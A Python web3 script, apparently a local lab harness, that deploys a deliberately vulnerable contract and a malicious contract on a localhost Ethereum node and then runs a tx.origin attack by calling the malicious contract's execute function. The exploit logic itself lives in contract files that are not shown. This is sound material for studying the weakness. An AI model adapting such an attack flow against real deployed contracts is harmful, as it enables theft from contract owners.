from web3 import Web3
import json

# Configuration
NODE_URL = 'http://localhost:8545'
VULNERABLE_CONTRACT_PATH = 'TXOriginVulnerableContract.json'
MALICIOUS_CONTRACT_PATH = 'MaliciousTXOriginContract.json'

def connect_to_ethereum(node_url):
    """Establish connection to Ethereum node."""
    try:
        web3 = Web3(Web3.HTTPProvider(node_url))
        if web3.isConnected():
            print("Connected to Ethereum node.")
            return web3
        else:
            raise ConnectionError("Failed to connect to Ethereum node.")
    except Exception as e:
        print(f"Connection error: {e}")
        exit(1)

def load_contract_data(file_path):
    """Load contract ABI and bytecode from JSON file."""
    with open(file_path) as f:
        data = json.load(f)
    return data['abi'], data['bytecode']

def deploy_contract(web3, abi, bytecode):
    """Deploy contract to the Ethereum network."""
    contract = web3.eth.contract(abi=abi, bytecode=bytecode)
    tx_hash = contract.constructor().transact()
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    return web3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

def perform_tx_origin_attack(vulnerable_contract, malicious_contract, web3):
    """Execute TX Origin attack using a malicious contract."""
    try:
        # Execute the attack
        tx_hash = malicious_contract.functions.execute(vulnerable_contract.address).transact()
        web3.eth.wait_for_transaction_receipt(tx_hash)
        print("TX Origin attack executed successfully.")
    except Exception as e:
        print(f"TX Origin attack failed: {e}")

if __name__ == "__main__":
    # Setup
    web3 = connect_to_ethereum(NODE_URL)
    
    # Load contracts
    vulnerable_abi, vulnerable_bytecode = load_contract_data(VULNERABLE_CONTRACT_PATH)
    malicious_abi, malicious_bytecode = load_contract_data(MALICIOUS_CONTRACT_PATH)
    
    # Deploy contracts
    vulnerable_contract = deploy_contract(web3, vulnerable_abi, vulnerable_bytecode)
    malicious_contract = deploy_contract(web3, malicious_abi, malicious_bytecode)
    
    # Perform attack
    perform_tx_origin_attack(vulnerable_contract, malicious_contract, web3)
